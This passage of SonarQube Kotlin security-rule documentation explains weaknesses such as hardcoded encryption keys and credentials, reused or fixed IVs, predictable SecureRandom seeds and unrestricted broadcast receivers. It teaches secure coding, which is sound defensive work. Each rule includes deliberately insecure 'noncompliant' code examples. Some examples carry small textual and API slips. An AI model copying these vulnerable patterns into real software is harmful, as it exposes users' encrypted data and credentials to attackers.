<p>Note that ActiveMQ, starting with version 5.12.2, forces developers to explicitly list packages that JMS messages can contain. This limits the risk
of successful exploitation. In versions before that one, calling the <code>ActiveMQConnectionFactory</code> constructor without further configuration
would leave the application at risk.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Apache ActiveMQ Documentation - <a href="https://activemq.apache.org/objectmessage.html">ObjectMessage</a> </li>
  <li> CVE - <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5254">CVE-2015-5254</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 - Category A8 - Software and Data
  Integrity Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 - Category A8 - Insecure
  Deserialization</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/502">CWE-502 - Deserialization of Untrusted Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6301">
              kotlin:S6301
            </a>
          </td>
          <td>
            <details>
              <p>When storing local data in a mobile application, it is common to use a database that can be encrypted. When encryption of this database is enabled,
the encryption key must be protected properly.</p>
<h2>Why is this an issue?</h2>
<p>Mobile applications often need to store data (which might be sensitive) locally. For Android, there exist several libraries that simplify this
process by offering a feature-rich database system. <a href="https://www.zetetic.net/sqlcipher/">SQLCipher</a> and <a
href="https://realm.io/">Realm</a> are examples of such libraries. These libraries often add support for database encryption, to protect the contents
from being read by other apps or by attackers.</p>
<p>When using encryption for such a database, it is important that the encryption key stays secret. If this key is hardcoded in the application, then
it should be considered compromised. The key will be known by anyone with access to the application’s binary code or source code. This means that the
sensitive encrypted data can be decrypted by anyone having access to the binary of the mobile application.</p>
<p>Furthermore, if the key is hardcoded, it is the same for every user. A compromise of this encryption key implicates every user of the app.</p>
<p>The encryption key is meant to stay secret and should not be hard-coded in the application as it would mean that:</p>
<h3>What is the potential impact?</h3>
<p>If an attacker is able to find the encryption key for the mobile database, this can potentially have severe consequences.</p>
<h4>Theft of sensitive data</h4>
<p>If a mobile database is encrypted, it is likely to contain data that is sensitive for the user or the app publisher. For example, it can contain
personally identifiable information (PII), financial data, login credentials, or other sensitive user data.</p>
<p>By not protecting the encryption key properly, it becomes very easy for an attacker to recover it and then decrypt the mobile database. At that
point, the theft of sensitive data might lead to identity theft, financial fraud, and other forms of malicious activities.</p>
<h2>How to fix it in Realm</h2>
<h3>Code examples</h3>
<p>In the example below, a local database is opened using a hardcoded key. To fix this, the key is moved to a secure location instead and retrieved
using a <code>getKey()</code> method.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="101" data-diff-type="noncompliant">
val key = "gb09ym9ydoolp3w886d0tciczj6ve9kszqd65u7d126040gwy86xqimjpuuc788g"
val config = RealmConfiguration.Builder()
    .encryptionKey(key.toByteArray()) // Noncompliant
    .build()
val realm = Realm.getInstance(config)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="101" data-diff-type="compliant">
val config = RealmConfiguration.Builder()
    .encryptionKey(getKey())
    .build()
val realm = Realm.getInstance(config)
</pre>
<h3>How does this work?</h3>
<h4>Using Android’s builtin key storage options</h4>
<p>The <a href="https://developer.android.com/privacy-and-security/keystore">Android Keystore</a> system allows apps to store encryption keys in a
container that is protected on a system level. Additionally, it can restrict when and how the keys are used. For example, it allows the app to require
user authentication (for example using a fingerprint) before the key is made available. This is the recommended way to store cryptographic keys on
Android.</p>
<h4>Dynamically retrieving encryption keys remotely</h4>
<p>As user devices are less trusted than controlled environments such as the application backend, the latter should be preferred for the storage of
encryption keys. This requires that a user’s device has an internet connection, which may not be suitable for every use case.</p>
<h3>Going the extra mile</h3>
<h4>Avoid storing sensitive data on user devices</h4>
<p>In general, it is always preferable to store as little sensitive data on user devices as possible.</p>
<p>Of course, some sensitive data always has to be stored on client devices, such as the data required for authentication. In this case, consider
whether the application logic can also function with a hash (or otherwise non-reversible form) of that data. For example, if an email address is
required for authentication, it might be possible to use and store a hashed version of this address instead.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Android Documentation - <a href="https://developer.android.com/privacy-and-security/keystore">Android Keystore system</a> </li>
  <li> Android Documentation - <a href="https://developer.android.com/privacy-and-security/security-tips#UserData">Security tips - User data</a> </li>
  <li> OWASP Mobile Application Security Testing Guide - <a
  href="https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05d-testing-data-storage">Data Storage on Android</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/311">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/321">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S2068">
              kotlin:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
val params = "password=xxxx" // Sensitive
val writer = OutputStreamWriter(getOutputStream())
writer.write(params)
writer.flush()
...
val password = "xxxx" // Sensitive
...
</pre>
<h2>Compliant Solution</h2>
<pre>
val params = "password=${retrievePassword()}"
val writer = OutputStreamWriter(getOutputStream())
writer.write(params)
writer.flush()
...
val password = retrievePassword()
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6432">
              kotlin:S6432
            </a>
          </td>
          <td>
            <details>
              <p>When encrypting data using AES-GCM or AES-CCM, it is essential not to reuse the same initialization vector (IV, also called nonce) with a given
key. To prevent this, it is recommended to either randomize the IV for each encryption or increment the IV after each encryption.</p>
<h2>Why is this an issue?</h2>
<p>When encrypting data using a counter (CTR) derived block cipher mode of operation, it is essential not to reuse the same initialization vector (IV)
for a given key. An IV that complies with this requirement is called a "nonce" (<strong>n</strong>umber used <strong>once</strong>). Galois/Counter
(GCM) and Counter with Cipher Block Chaining-Message Authentication Code (CCM) are both derived from counter mode.</p>
<p>When using AES-GCM or AES-CCM, a given key and IV pair will create a "keystream" that is used to encrypt a plaintext (original content) into a
ciphertext (encrypted content.) For any key and IV pair, this keystream is always deterministic. Because of this property, encrypting several
plaintexts with one key and IV pair can be catastrophic. If an attacker has access to one plaintext and its associated ciphertext, they are able to
decrypt everything that was created using the same pair.</p>
<p>Additionally, IV reuse also drastically decreases the key recovery computational complexity by downgrading it to a simpler polynomial root-finding
problem. This means that even without access to a plaintext/ciphertext pair, an attacker may still be able to decrypt all the sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>If the encryption that is being used is flawed, attackers might be able to exploit it in several ways. They might be able to decrypt existing
sensitive data or bypass key protections.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By not using the encryption algorithm correctly, the likelihood that an attacker might be able to recover the original sensitive data drastically
increases.</p>
<h4>Additional attack surface</h4>
<p>Encrypted values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them. If an
attacker is able to modify the cleartext of the encrypted message, it might be possible to trigger other vulnerabilities in the code.</p>
<h2>How to fix it in Java Cryptography Extension</h2>
<h3>Code examples</h3>
<p>The example uses a hardcoded IV as a nonce, which causes AES-CCM to be insecure. To fix it, a nonce is randomly generated instead.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="101" data-diff-type="noncompliant">
fun encrypt(key: ByteArray, ptxt: ByteArray) {
    val iv = "7cVgr5cbdCZV".toByteArray()

    val cipher = Cipher.getInstance("AES/GCM/NoPadding")
    val keySpec = SecretKeySpec(key, "AES")
    val gcmSpec = GCMParameterSpec(128, iv)

    cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec) // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="101" data-diff-type="compliant">
fun encrypt(key: ByteArray, ptxt: ByteArray) {
    val random = SecureRandom()
    val iv = ByteArray(12)
    random.nextBytes(iv)

    val cipher = Cipher.getInstance("AES/GCM/NoPadding")
    val keySpec = SecretKeySpec(key, "AES")
    val gcmSpec = GCMParameterSpec(128, iv)

    cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec)
}
</pre>
<h3>How does this work?</h3>
<p>For AES-GCM and AES-CCM, NIST recommends generating a nonce using either a deterministic approach or using a 'Random Bit Generator (RBG)'.</p>
<h4>Generating nonces using random number generation</h4>
<p>When using a randomized approach, NIST recommends a nonce of at least 96 bits using a cryptographically secure pseudorandom number generator
(CSPRNG.) Such a generator can create output with a sufficiently low probability of the same number being output twice (also called a
<em>collision</em>) for a long time. However, after 2<sup>32</sup> generated numbers for the same key, NIST recommends rotating this key for a new
one. After that amount of generated numbers, the probability of a collision is high enough to be considered insecure.</p>
<p>The code example above demonstrates how CSPRNGs can be used to generate nonces.</p>
<p>Be careful to use a random number generator that is sufficiently secure. Default (non-cryptographically secure) RNGs might be more prone to
collisions in their output, which is catastrophic for counter-based encryption modes.</p>
<h4>Deterministically generating nonces</h4>
<p>One method to prevent the same IV from being used multiple times for the same key is to update the IV in a deterministic way after each encryption.
The most straightforward deterministic method for this is a counter.</p>
<p>The way this works is simple: for any key, the first IV is the number zero. After this IV is used to encrypt something with a key, it is
incremented for that key (and is now equal to 1). Although this requires additional bookkeeping, it should guarantee that for each encryption key, an
IV is never repeated.</p>
<p>For a secure implementation, NIST suggests generating these nonces in two parts: a fixed field and an invocation field. The fixed field should be
used to identify the device executing the encryption (for example, it could contain a device ID), such that for one key, no two devices can generate
the same nonce. The invocation field contains the counter as described above. For a 96-bit nonce, NIST recommends (but does not require) using a
32-bit fixed field and a 64-bit invocation field. Additional details can be found in the <a
href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf">NIST Special Publication 800-38D</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/323">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38c.pdf">NIST, SP-800-38C</a> - Recommendation for Block Cipher
  Modes of Operation: The CCM Mode for Authentication and Confidentiality </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf">NIST, SP-800-38D</a> - Recommendation for Block Cipher
  Modes of Operation: Galois/Counter Mode (GCM) and GMAC </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S3329">
              kotlin:S3329
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an
initialization vector (IV), also called a "starting variable" (SV).</p>
<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same
ciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.nio.charset.StandardCharsets
import java.security.InvalidAlgorithmParameterException
import java.security.InvalidKeyException
import java.security.NoSuchAlgorithmException
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

fun encrypt(key: String, plainText: String) {

    val randomBytes = "7cVgr5cbdCZVw5WY".toByteArray(StandardCharsets.UTF_8)

    val iv      = GCMParameterSpec(128, randomBytes)
    val keySpec = SecretKeySpec(key.toByteArray(StandardCharsets.UTF_8), "AES")

    try {
        val cipher = Cipher.getInstance("AES/CBC/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv) // Noncompliant

    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: InvalidKeyException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    } catch (e: InvalidAlgorithmParameterException) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<p>In this example, the code explicitly uses a number generator that is considered <strong>strong</strong>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
import java.nio.charset.StandardCharsets
import java.security.SecureRandom
import java.security.InvalidAlgorithmParameterException
import java.security.InvalidKeyException
import java.security.NoSuchAlgorithmException
import javax.crypto.Cipher
import javax.crypto.NoSuchPaddingException
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

fun encrypt(key: String, plainText: String) {

    val random      = SecureRandom();
    val randomBytes = ByteArray(16);
    random.nextBytes(randomBytes);

    val iv      = GCMParameterSpec(128, randomBytes)
    val keySpec = SecretKeySpec(key.toByteArray(StandardCharsets.UTF_8), "AES")

    try {
        val cipher = Cipher.getInstance("AES/CBC/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv)

    } catch (e: NoSuchAlgorithmException) {
        // ...
    } catch (e: InvalidKeyException) {
        // ...
    } catch (e: NoSuchPaddingException) {
        // ...
    } catch (e: InvalidAlgorithmParameterException) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use unique IVs</h4>
<p>To ensure high security, initialization vectors must meet two important criteria:</p>
<ul>
  <li> IVs must be unique for each encryption operation. </li>
  <li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li>
</ul>
<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>
<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br> It is that the same IV is used for multiple encryption
attempts.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/329">MITRE, CWE-329</a> - Not Using an Unpredictable IV with CBC Mode </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4347">
              kotlin:S4347
            </a>
          </td>
          <td>
            <details>
              <p>When using <code>SecureRandom</code>, it is important not to use predictable seeds. This class is used to generate cryptographically strong random
numbers. Using a predictable seed will make its output predictable as well, which counteracts the use case of <code>SecureRandom</code>.</p>
<h2>Why is this an issue?</h2>
<p><code>java.security.SecureRandom</code> is often used to generate random values for cryptographic algorithms. When a random number generator is
used for cryptographic purposes, the generated numbers must be as random and unpredictable as possible. When <code>SecureRandom</code> is improperly
seeded with a constant or a predictable value, its output will also be predictable.</p>
<p>This can have severe security implications for cryptographic operations that rely on the randomness of the generated numbers. By using a
predictable seed, an attacker can potentially guess or deduce the generated numbers, compromising the security of whatever cryptographic algorithm
relies on <code>SecureRandom</code>.</p>
<h3>What is the potential impact?</h3>
<p>It is crucial to understand that the strength of cryptographic algorithms heavily relies on the quality of the random numbers used. By improperly
seeding the <code>SecureRandom</code> class, we introduce a significant weakness that can be exploited by attackers.</p>
<h4>Insecure cryptographic keys</h4>
<p>One of the primary use cases for the <code>SecureRandom</code> class is generating cryptographic keys. If an attacker can predict the seed used to
initialize the SecureRandom instance, they may be able to derive the same keys. Depending on the use case, this can lead to multiple severe outcomes,
such as:</p>
<ul>
  <li> Being able to decrypt sensitive documents, leading to privacy breaches or identity theft. </li>
  <li> Gaining access to a private key used for signing, allowing an attacker to forge digital signatures and impersonate legitimate entities. </li>
  <li> Bypassing authentication mechanisms that rely on public-key infrastructure (PKI), which can be abused to gain unauthorized access to systems or
  networks. </li>
</ul>
<h4>Session hijacking and man-in-the-middle attack</h4>
<p>Another scenario where this vulnerability can be exploited is in the generation of session tokens or nonces for secure communication protocols. If
an attacker can predict the seed used to generate these tokens, they can impersonate legitimate users or intercept sensitive information.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code uses a cryptographically strong random number generator to generate data that is not cryptographically strong.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.security.SecureRandom

val sr = SecureRandom()
sr.setSeed(123456L) // Noncompliant
val v = sr.nextInt()
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
import java.security.SecureRandom

val sr = SecureRandom("abcdefghijklmnop".toByteArray(charset("us-ascii"))) // Noncompliant
val v = sr.nextInt()
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.security.SecureRandom

val sr = SecureRandom()
val v = sr.nextInt()
</pre>
<p>This solution is available for JDK 1.8 and higher.</p>
<pre data-diff-id="2" data-diff-type="compliant">
import java.security.SecureRandom

val sr = SecureRandom.getInstanceStrong()
val v = sr.nextInt()
</pre>
<h3>How does this work?</h3>
<p>When the randomly generated data needs to be cryptographically strong, <code>SecureRandom</code> is the correct class to use. However, its
documentation also cites that "any seed material passed to a <code>SecureRandom</code> object must be unpredictable". When no seed is passed by the
user to the object, the <code>SecureRandom</code> object chooses an unpredictable seed by default. Therefore, the easiest way to fix the issue is to
use the default constructor without any calls to <code>SecureObject.setSeed()</code>.</p>
<p>To go the extra mile, <code>SecureObject.getInstanceStrong()</code> returns an instance of <code>SecureObject</code> that is guaranteed to use a
strong algorithm for its number generation.</p>
<p>If the randomly generated data is not used for cryptographic purposes and is not business critical, it may be a better choice to use
<code>java.util.Random</code> instead. In this case, setting a predictable seed may be acceptable depending on the situation.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Java Documentation - <a href="https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/security/SecureRandom.html">Class
  <code>java.security.SecureRandom</code></a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/330">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/332">MITRE, CWE-332</a> - Insufficient Entropy in PRNG </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/336">MITRE, CWE-336</a> - Same Seed in Pseudo-Random Number Generator (PRNG) </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/337">MITRE, CWE-337</a> - Predictable Seed in Pseudo-Random Number Generator (PRNG) </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/MSC63-J.+Ensure+that+SecureRandom+is+properly+seeded">CERT, MSC63J.</a> - Ensure that
  SecureRandom is properly seeded </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5322">
              kotlin:S5322
            </a>
          </td>
          <td>
            <details>
              <p>Android applications can receive broadcasts from the system or other applications. Receiving intents is security-sensitive. For example, it has led
in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1677">CVE-2019-1677</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1275">CVE-2015-1275</a> </li>
</ul>
<p>Receivers can be declared in the manifest or in the code to make them context-specific. If the receiver is declared in the manifest Android will
start the application if it is not already running once a matching broadcast is received. The receiver is an entry point into the application.</p>
<p>Other applications can send potentially malicious broadcasts, so it is important to consider broadcasts as untrusted and to limit the applications
that can send broadcasts to the receiver.</p>
<p>Permissions can be specified to restrict broadcasts to authorized applications. Restrictions can be enforced by both the sender and receiver of a
broadcast. If permissions are specified when registering a broadcast receiver, then only broadcasters who were granted this permission can send a
message to the receiver.</p>
<p>This rule raises an issue when a receiver is registered without specifying any broadcast permission.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The data extracted from intents is not sanitized. </li>
  <li> Intents broadcast is not restricted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See the <a
href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.BroadcastReceiver
import android.content.Context
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import androidx.annotation.RequiresApi

class MyIntentReceiver {
    @RequiresApi(api = Build.VERSION_CODES.O)
    fun register(
        context: Context, receiver: BroadcastReceiver?,
        filter: IntentFilter?,
        scheduler: Handler?,
        flags: Int
    ) {
        context.registerReceiver(receiver, filter) // Sensitive
        context.registerReceiver(receiver, filter, flags) // Sensitive

        // Broadcasting intent with "null" for broadcastPermission
        context.registerReceiver(receiver, filter, null, scheduler) // Sensitive
        context.registerReceiver(receiver, filter, null, scheduler, flags) // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.BroadcastReceiver
import android.content.Context
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import androidx.annotation.RequiresApi

class MyIntentReceiver {
    @RequiresApi(api = Build.VERSION_CODES.O)
    fun register(
        context: Context, receiver: BroadcastReceiver?,
        filter: IntentFilter?,
        broadcastPermission: String?,
        scheduler: Handler?,
        flags: Int
    ) {
        context.registerReceiver(receiver, filter, broadcastPermission, scheduler)
        context.registerReceiver(receiver, filter, broadcastPermission, scheduler, flags)
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/925">MITRE, CWE-925</a> - Improper Verification of Intent by Broadcast Receiver </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/926">MITRE, CWE-926</a> - Improper Export of Android Application Components </li>
  <li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5324">
              kotlin:S5324
            </a>
          </td>
          <td>
            <details>
              <p>Storing data locally is a common task for mobile applications. Such data includes files among other things. One convenient way to store files is to
use the external file storage which usually offers a larger amount of disc space compared to internal storage.</p>
<p>Files created on the external storage are globally readable and writable. Therefore, a malicious application having the permissions
<code>WRITE_EXTERNAL_STORAGE</code> or <code>READ_EXTERNAL_STORAGE</code> could try to read sensitive information from the files that other
applications have stored on the external storage.</p>
<p>External storage can also be removed by the user (e.g when based on SD card) making the files unavailable to the application.</p>
<h2>Ask Yourself Whether</h2>
<p>Your application uses external storage to:</p>
<ul>
  <li> store files that contain sensitive data. </li>
  <li> store files that are not meant to be shared with other application. </li>
  <li> store files that are critical for the application to work. </li>
</ul>
